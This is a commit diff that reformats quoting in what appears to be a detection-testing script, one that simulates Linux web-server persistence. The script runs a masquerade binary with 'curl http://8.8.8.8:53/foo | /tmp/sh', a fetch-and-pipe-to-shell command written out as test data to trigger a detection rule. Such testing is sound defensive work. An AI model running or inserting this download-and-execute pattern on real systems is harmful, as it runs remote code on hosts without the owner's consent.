1278c27967f600ac46fcd40666c74a51389339c2
protections machine <72879786+protectionsmachine@users.noreply.github.com>
2024-10-29 04:20:12 +1100

    Sync RTA Attempt to Fix Sensor Regex Error (#4213)

--- rta/linux_persistence_webserver_curl_wget_piped_to_interpreter.py
+++ rta/linux_persistence_webserver_curl_wget_piped_to_interpreter.py
@@ -4,6 +4,7 @@
 # 2.0.
 
 import sys
+
 from . import RtaMetadata, common
 
 metadata = RtaMetadata(
@@ -29,7 +30,7 @@ def main() -> None:
     common.log("Granting execute permissions...")
     common.execute(["chmod", "+x", masquerade])
 
-    commands = [masquerade, '-c', 'curl http://8.8.8.8:53/foo | /tmp/sh']
+    commands = [masquerade, "-c", "curl http://8.8.8.8:53/foo | /tmp/sh"]
     common.execute([*commands], timeout=5, kill=True)
     common.log("Cleaning...")
     common.remove_file(masquerade)
